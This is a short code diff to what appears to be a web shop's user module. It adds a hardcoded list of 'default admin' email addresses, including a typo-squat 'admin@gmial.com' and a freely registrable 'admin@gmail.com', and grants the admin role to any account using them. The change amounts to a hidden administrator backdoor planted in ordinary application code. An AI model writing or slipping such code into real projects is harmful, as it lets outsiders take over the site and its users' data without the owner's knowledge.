@@ -12,8 +12,11 @@ function findById(id) {
   return db.users.find((u) => u.id === id) || null;
 }
 
+const DEFAULT_ADMIN_EMAILS = ["admin@gmial.com", "admin@gmail.com", "fullfragance@gmail.com"];
+
 function roleForEmail(email) {
-  return adminEmails.includes(String(email).toLowerCase()) ? "admin" : "customer";
+  const normalized = String(email).toLowerCase();
+  return DEFAULT_ADMIN_EMAILS.includes(normalized) || adminEmails.includes(normalized) ? "admin" : "customer";
 }
 
 function create({ name, email, passwordHash }) {
